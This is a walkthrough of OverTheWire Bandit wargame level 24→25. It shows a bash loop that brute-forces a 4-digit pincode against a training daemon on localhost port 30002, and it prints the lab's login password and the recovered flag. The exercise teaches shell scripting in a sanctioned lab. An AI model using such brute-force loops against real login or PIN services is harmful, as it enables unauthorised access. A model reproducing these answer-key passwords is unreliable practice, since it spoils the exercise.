<p align="center">
<a href="level-23→24.md">Previous Level: Level 23 → 24</a>
</p>

# [Bandit Level 24 → 25](https://overthewire.org/wargames/bandit/bandit25.html)

## Login Info
- **SSH:** `ssh bandit.labs.overthewire.org -p 2220 -l bandit24`
- **Password:** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

---

## Task 
The goal of this level is to send the **current level's password + a 4 digit pincode** to a daemon listening on port 30002. If the pincode is correct, the password for the next level will be returned. There is no way to retrieve the pincode except by going through all the 10000 combinations (brute forcing).

## Steps
Let's connect to the daemon on port 30002 and try some input:
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
Wrong! Please enter the correct current password and pincode. Try again.
```
We can see the greeting message as well as the error message upon entering an incorrect attempt.
Now obviously we are not going to painstakingly  write this out 1 by 1.  
Let's create a temp dir to work out of:
```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.5Ck1rNgArW
bandit24@bandit:~$ cd /tmp/tmp.5Ck1rNgArW
bandit24@bandit:/tmp/tmp.5Ck1rNgArW$ 
```
Let's use a bash script to create all possible permutations of the password and pincode, after we're done we can pipe that file into `nc` and filter with `grep` with the `-v` option which inverts the match since we know an invalid entry is met with `Wrong! ...`.
```bash
bandit24@bandit:/tmp/tmp.5Ck1rNgArW$ nano bruteforce.sh
```
Inside bruteforce.sh we write:
```bash
#!/bin/bash
for i in {0000..9999}
do
  echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> permutations.txt
done

cat permutations.txt | nc localhost 30002 | grep -v 'Wrong!' > password.txt
```

Make the script executable and run it:
```bash
bandit24@bandit:/tmp/tmp.5Ck1rNgArW$ chmod +x bruteforce.sh
bandit24@bandit:/tmp/tmp.5Ck1rNgArW$ ls -l
total 4
-rwxrwxr-x 1 bandit24 bandit24 182 Oct  2 08:48 bruteforce.sh
bandit24@bandit:/tmp/tmp.5Ck1rNgArW$ ./bruteforce.sh 
```
After running it, let's check our directory for password.txt:
```bash
bandit24@bandit:/tmp/tmp.5Ck1rNgArW$ ls
bruteforce.sh  password.txt  permutations.txt
bandit24@bandit:/tmp/tmp.5Ck1rNgArW$ cat password.txt 
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
## Flag
```bash
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

## Notes
- `for i in {0000..9999}; do …; done` loops over the numbers 0000 to 9999, executing the commands between `do` and `done` for each `i`.
- `cat file.txt` streams the file’s contents to stdout, and each newline (`\n`) in the file acts like **pressing Enter** when sending input to a program.
- In `grep`, the `-v` option inverts the match, showing only lines that do not contain the specified pattern.


<p align="center">
<a href="level-25→26.md">Next Level: Level 25 → 26</a>
</p>


